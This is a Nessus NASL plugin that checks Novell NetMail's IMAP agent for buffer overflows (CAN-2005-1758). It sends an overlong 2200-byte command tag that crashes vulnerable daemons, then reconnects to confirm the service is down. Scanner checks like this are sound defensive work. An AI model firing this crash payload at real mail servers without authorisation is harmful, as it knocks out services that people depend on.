#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(18506);
  script_version("$Revision: 1.1 $");
  script_cve_id("CAN-2005-1758");
  script_bugtraq_id(13926);

  name["english"] = "Novell NetMail IMAP Agent Multiple Buffer Overflows";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running Novell NetMail, a messaging and calendaring
system for Windows, Linux, Unix, and Netware. 

The version of NetMail installed on the remote host is prone to
multiple buffer overflows in its IMAP agent, one when handling long
command tags, the other involving IMAP command continuations. 

See also : http://support.novell.com/filefinder/19357/index.html
Solution : Upgrade to NetMail version 3.52C.
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple buffer overflows in Novell NetMail's IMAP agent";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  family["english"] = "Gain a shell remotely";
  script_family(english:family["english"]);

  script_dependencie("find_service.nes", "imap_overflow.nasl");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}

include("misc_func.inc");
include("imap_func.inc");


# Check the imap server.
port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(1);
if (get_kb_item("imap/false_imap") || get_kb_item("imap/overflow")) exit(1);

# If it's NetMail...
banner = get_imap_banner(port:port);
if ("NetMail IMAP4 Agent" >< banner) {
  # Try to exploit one of the buffer overflows.

  # Establish a connection.
  soc = open_sock_tcp(port);
  if (soc) {
    s = recv_line(socket:soc, length:1024);
    if (strlen(s)) {
      # An overly-long tag crashes a vulnerable imap daemon.
      #
      # nb: ~2200 seems to be the cutoff for whether it crashes or not.
      c = string(crap(2200), "1");
      send(socket:soc, data:string(c, "\r\n"));
      s = recv_line(socket:soc, length:1024);

      # If we get a response, it's not vulnerable.
      if (s) {
        c = string("a1 LOGOUT");
        send(socket:soc, data:string(c, "\r\n"));
        s = recv_line(socket:soc, length:1024);
      }
      # Else let's make sure it's really down.
      else {
        sleep(1);
        # Try to reestablish a connection and read the banner.
        soc2 = open_sock_tcp(port);
        if (soc2) s2 = recv_line(socket:soc2, length:1024);

        # If we couldn't establish the connection or read the banner,
        # there's a problem.
        if (!soc2 || !strlen(s2)) {
          security_hole(port);
          exit(0);
        }
        close(soc2);
      }
    }
    close(soc);
  }
}
